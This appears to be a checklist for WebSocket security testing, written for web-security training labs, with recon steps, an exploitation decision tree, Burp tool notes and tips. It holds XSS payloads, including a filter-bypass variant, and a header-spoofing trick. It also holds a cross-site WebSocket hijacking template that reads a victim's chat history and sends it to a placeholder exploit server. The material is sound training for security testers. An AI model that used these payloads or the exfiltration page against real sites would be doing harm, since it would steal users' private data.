# WebSockets Testing Checklist

## Recon

1. **Find WebSocket usage** - live chat, notifications, live feeds, price tickers. Burp: Proxy > WebSockets history
2. **Read the handshake** - the initial HTTP request with `Upgrade: websocket`; note how it is authenticated (cookie? token? Origin check?)
3. **Map the messages** - what JSON structure do frames use, and where does the content get rendered or processed?
4. **Note the direction** - WebSockets are bidirectional, so responses can be read back (matters for exfiltration)

## Exploitation path

```
Where is the flaw reachable?
|
+-- In the message content
|   +-- Rendered without sanitisation? -> inject XSS in the frame (Lab 1)
|       - edit the outgoing frame in WebSockets Repeater: <img src=1 onerror='alert(1)'>
|
+-- In the handshake
|   +-- Security decision from a header? -> tamper it on reconnect (Lab 2)
|       - add X-Forwarded-For to spoof IP / bypass a ban
|       - obfuscate a filtered payload: <img src=1 oNeRror=alert`1`>
|
+-- In the handshake's CSRF posture
    +-- Cookie-authenticated, no CSRF token, no Origin check? -> CSWSH (Lab 3)
        - attacker page opens the WebSocket, sends the history command (READY),
          reads responses back, exfiltrates to the exploit server / Collaborator
```

## CSWSH exfiltration template (Lab 3)

```html
<script>
var ws = new WebSocket('wss://LAB-ID.web-security-academy.net/chat');
ws.onopen = function(){ ws.send('READY'); };
ws.onmessage = function(event){
  fetch('https://YOUR-EXPLOIT-SERVER.exploit-server.net/exfil?d=' + encodeURIComponent(event.data));
};
</script>
```

The cross-origin `fetch` is blocked from reading its response, but the request still reaches your server and is logged - the data in the query string is what matters.

## Tools & automation

**Burp tools**
- WebSockets history (Proxy) - observe frames in both directions
- WebSockets Repeater - edit and replay frames on the live connection; "Reconnect" lets you edit the handshake request (add headers like X-Forwarded-For)
- Exploit server - host and deliver the CSWSH page; read exfiltrated data from its access log
- Collaborator - alternative exfiltration sink for CSWSH

**Scripts / exploits**
- lab-03 has an `exploit.html` (the CSWSH page delivered from the exploit server)
- labs 1-2 are Burp-driven (edit frames / handshake) and browser-rendered, so there is no Python solve - the payloads in each lab README are the exploit

## Tips

- Data over a WebSocket is still untrusted input - the same XSS/SQLi sinks apply, only the transport differs
- Never trust handshake headers (X-Forwarded-For, etc.) for security decisions - they are attacker-controlled
- Blocklist XSS filters fall to case variation and alternative call syntax (`oNeRror=alert`1``)
- A cookie-authenticated handshake with no CSRF token and no Origin check is hijackable; because the channel is bidirectional, the impact is data theft, not just blind action forgery
- CSWSH is the exact technique behind CSRF Lab 9 (SameSite Strict bypass via sibling domain)
